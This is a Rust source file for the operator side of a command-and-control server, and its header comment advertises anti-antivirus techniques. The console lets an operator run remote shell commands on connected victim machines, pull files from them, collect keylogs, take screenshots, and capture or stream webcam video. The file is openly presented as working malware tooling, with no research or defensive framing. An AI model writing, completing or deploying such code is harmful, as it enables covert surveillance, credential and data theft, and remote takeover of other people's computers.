// C2 Server Implementation in Rust with Anti-AV Techniques

mod config;
mod security;
mod crypto;
mod commands;
mod client_handler;

use std::collections::HashMap;
use std::io::Write;
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::sync::{mpsc, Mutex};
use hex;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum ServerError {
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("TOML parse error: {0}")]
    Toml(#[from] toml::de::Error),
    #[error("Hex decode error: {0}")]
    Hex(#[from] hex::FromHexError),
    #[error("Encryption error: {0}")]
    Encryption(String),
    #[error("Decryption error: {0}")]
    Decryption(String),
    #[error("Serialization error: {0}")]
    Serde(#[from] serde_json::Error),
    #[error("Invalid key length")]
    InvalidKeyLength,
}

use config::load_config;
use security::perform_security_checks;
use commands::Command;
use client_handler::{Client, handle_client};

async fn send_command_to_client(
    clients: &Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>>,
    id: usize,
    command: Command,
    success_msg: &str,
) {
    let clients_lock = clients.lock().await;
    if let Some(tx) = clients_lock.get(&id) {
        let _ = tx.send(command).await;
        println!("{}", success_msg);
    } else {
        println!("Client {} not found", id);
    }
}

async fn handle_user_input(clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>>) {
    loop {
        print!("C2> ");
        std::io::stdout().flush().unwrap();
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        let parts: Vec<&str> = input.trim().split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }
        match parts[0] {
            "list" => {
                let clients_lock = clients.lock().await;
                if clients_lock.is_empty() {
                    println!("No clients connected");
                } else {
                    println!("Connected clients:");
                    for (id, _) in clients_lock.iter() {
                        println!("  Client {}", id);
                    }
                }
            }
            "shell" => {
                if parts.len() < 3 {
                    println!("Usage: shell <client_id> <command>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    let cmd = parts[2..].join(" ");
                    send_command_to_client(
                        &clients,
                        id,
                        Command::Shell(cmd),
                        &format!("Sent shell command to client {}", id),
                    )
                    .await;
                }
            }
            "download" => {
                if parts.len() < 3 {
                    println!("Usage: download <client_id> <filename>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    send_command_to_client(
                        &clients,
                        id,
                        Command::Download(parts[2].to_string()),
                        &format!("Requested download from client {}", id),
                    )
                    .await;
                }
            }
            "keylog" => {
                if parts.len() < 2 {
                    println!("Usage: keylog <client_id>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    send_command_to_client(
                        &clients,
                        id,
                        Command::Keylog,
                        &format!("Requested keylog from client {}", id),
                    )
                    .await;
                }
            }
            "screenshot" => {
                if parts.len() < 2 {
                    println!("Usage: screenshot <client_id>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    send_command_to_client(
                        &clients,
                        id,
                        Command::Screenshot,
                        &format!("Requested screenshot from client {}", id),
                    )
                    .await;
                }
            }
            "webcam" => {
                if parts.len() < 2 {
                    println!("Usage: webcam <client_id>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    send_command_to_client(
                        &clients,
                        id,
                        Command::Webcam,
                        &format!("Requested webcam from client {}", id),
                    )
                    .await;
                }
            }
            "webcam_stream" => {
                if parts.len() < 2 {
                    println!("Usage: webcam_stream <client_id>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    send_command_to_client(
                        &clients,
                        id,
                        Command::WebcamStream,
                        &format!("Started webcam stream from client {}", id),
                    )
                    .await;
                }
            }
            "exit" => {
                if parts.len() < 2 {
                    println!("Usage: exit <client_id>");
                    continue;
                }
                if let Ok(id) = parts[1].parse::<usize>() {
                    send_command_to_client(
                        &clients,
                        id,
                        Command::Exit,
                        &format!("Sent exit command to client {}", id),
                    )
                    .await;
                }
            }
            "help" => {
                println!("Commands:");
                println!("  list - List connected clients");
                println!("  shell <id> <cmd> - Execute shell command on client");
                println!("  download <id> <file> - Download file from client");
                println!("  keylog <id> - Get keylog from client");
                println!("  screenshot <id> - Capture screenshot from client");
                println!("  webcam <id> - Capture webcam image from client");
                println!("  webcam_stream <id> - Record webcam video for ~2 seconds (saved as client_<id>_webcam_video.mp4)");
                println!("  exit <id> - Disconnect client");
                println!("  help - Show this help");
            }
            _ => println!("Unknown command. Type 'help' for help."),
        }
    }
}

#[tokio::main]
async fn main() {
    perform_security_checks();
    let config = match load_config() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to load config: {}", e);
            std::process::exit(1);
        }
    };
    let port = config.server.port;
    let key_str = config.security.encryption_key;
    let mut encryption_key = [0u8; 32];
    if let Err(e) = hex::decode_to_slice(&key_str, &mut encryption_key) {
        eprintln!("Invalid encryption key: {}", e);
        std::process::exit(1);
    }
    println!("C2 Server listening on port {}", port);
    let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)).await {
        Ok(l) => l,
        Err(e) => {
            eprintln!("Failed to bind to port {}: {}", port, e);
            std::process::exit(1);
        }
    };
    let clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>> = Arc::new(Mutex::new(HashMap::new()));
    let clients_clone = clients.clone();
    tokio::spawn(async move {
        handle_user_input(clients_clone).await;
    });
    let mut client_id = 0;
    while let Ok((stream, _)) = listener.accept().await {
        let id = client_id;
        client_id += 1;
        println!("Client {} connected", id);
        let (tx, rx) = mpsc::channel(100);
        clients.lock().await.insert(id, tx);
        let client = Client { id, stream };
        tokio::spawn(async move {
            handle_client(client, rx, &encryption_key).await;
        });
    }
}